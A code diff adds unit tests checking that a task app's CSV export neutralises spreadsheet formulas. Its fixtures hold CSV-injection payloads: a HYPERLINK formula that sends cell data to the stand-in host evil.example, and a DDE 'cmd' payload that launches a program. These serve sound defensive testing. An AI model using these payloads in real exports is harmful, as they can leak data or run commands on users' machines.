@@ -2,6 +2,7 @@ import { describe, it, expect } from "vitest";
 import {
   buildCsvExport,
   buildJsonExport,
+  csvEscape,
   importFromJson,
   importFromTodoistCsv,
   importFromGenericCsv,
@@ -71,6 +72,34 @@ describe("buildCsvExport", () => {
   it("maps listId to list display name", () => {
     const csv = buildCsvExport([TASK], [LIST]);
     expect(csv).toContain("Inbox");
+  });
+
+  it("neutralises spreadsheet formulas in task text", () => {
+    const task: Task = {
+      ...TASK,
+      title: '=HYPERLINK("http://evil.example/?"&A2,"Click")',
+      body: { content: "+1+cmd|' /C calc'!A0", contentType: "text" },
+      categories: ["@SUM(1)"],
+    };
+    const dataLine = buildCsvExport([task], [LIST]).split("\n")[1];
+    expect(dataLine.startsWith(`"'=HYPERLINK(`)).toBe(true);
+    expect(dataLine).toContain("'+1+cmd");
+    expect(dataLine).toContain("'@SUM(1)");
+  });
+});
+
+describe("csvEscape", () => {
+  it.each(["=1+1", "+1", "-1", "@A1", "\tx", "\rx"])("prefixes formula trigger %j with a quote", (value) => {
+    expect(csvEscape(value).replace(/^"/, "").startsWith("'")).toBe(true);
+  });
+
+  it("leaves ordinary text untouched", () => {
+    expect(csvEscape("Buy milk")).toBe("Buy milk");
+    expect(csvEscape("Email a@b.com")).toBe("Email a@b.com");
+  });
+
+  it("quotes values containing carriage returns", () => {
+    expect(csvEscape("a\rb")).toBe('"a\rb"');
   });
 });
 
